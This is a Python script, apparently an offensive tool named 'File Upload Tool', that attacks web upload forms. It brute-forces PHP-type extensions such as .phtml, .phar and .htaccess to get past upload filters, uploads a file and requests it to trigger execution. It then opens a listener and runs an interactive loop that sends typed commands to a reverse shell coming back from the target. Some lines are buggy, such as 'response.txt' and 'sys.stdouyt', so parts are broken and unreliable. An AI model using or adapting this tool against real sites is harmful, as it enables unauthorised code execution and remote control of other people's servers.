import requests
import argparse
import socket, sys, time, os

def brute_ext(url, data, path, file):
 
    extensions = [".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]

    old_path = file

    for extension in extensions:
        
        file_path = old_path + extension
        os.rename(old_path, file_path) 
        old_path = file_path

        ##Change files to match your upload form 
        files = {'fileToUpload' : open(file_path)}
        res = requests.post(url, files=files, data=data)
        if res.status_code == 200 and path:
            trigger = requests.get(url + path + "/" + file_path)
            if trigger.status_code == 200:
                print("valid filetype found: ", extension)
                

    os.rename(file_path, file)
    

parser = argparse.ArgumentParser(prog='File Upload Tool', description='Tool that will help you test for file upload vulnerabilities automatically')


parser.add_argument('--bruteforce_extensions','-B', action="store_true", help='Check for valid filetypes')
parser.add_argument('--file_path', '-f', type=str, help='Path to file you want to be uploaded')
parser.add_argument('--url', '-u', type=str, help='Website Url')
parser.add_argument('--shell', '-s', action="store_true", help='spawn shell (path to uploaded file required)')
parser.add_argument('--path', '-P', type=str, help='Path to uploaded file e.g "/uploads"')
parser.add_argument('--ip', '-i', type=str, help='Ip you want your shell to connect to')
parser.add_argument('--port', '-p', type=int, help='Listener port')


args = parser.parse_args()

url = args.url
file_path = args.file_path 
path = args.path
ip = '127.0.0.1'
port = 4444

if not file_path:
    print("Provide path to file you want to upload -f")
    exit(1)

if args.shell:
    ip = args.ip
    port = args.port

##Change to match your upload form

files = {'fileToUpload' : open(file_path, 'rb')}
data = {'submit' : 'Upload'}

if args.bruteforce_extensions:
    if not args.path:
        print("No path specified, can't check if file was successfully uploaded, but proceeding")

    brute_ext(url, data, path, file_path)
    exit(1)
#Sending files 
response = requests.post(url, files=files, data=data)


if response.status_code == 200:
    print('File uploaded')    
else:
    print('Failed: ', response.txt)

##Spawning shell
if args.shell:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(0)
    print("Listening on port" + str(port))
    
    time.sleep(5)
    
    try:
        ##Try triggering uploaded shell
        
        file_name = os.path.basename(file_path)
        execute_shell = requests.get(url + path + "/" + file_name)
        if execute_shell.status_code == 200:
            print("Shell triggered but no connection captured")
        else:
            pass
    except requests.exceptions.RequestException as e:
        print(f"Request failed") 
        
    conn, addr = s.accept()
    print("Connection recieved from ",addr)
    
   
    while True:
        ans = conn.recv(1023).decode()
        sys.stdout.write(ans)
        command = input()

        command += "\n"
        conn.send(command.encode())
        time.sleep(0)

        sys.stdouyt.write("\032[A" + ans.split("\n")[-1])




    
    


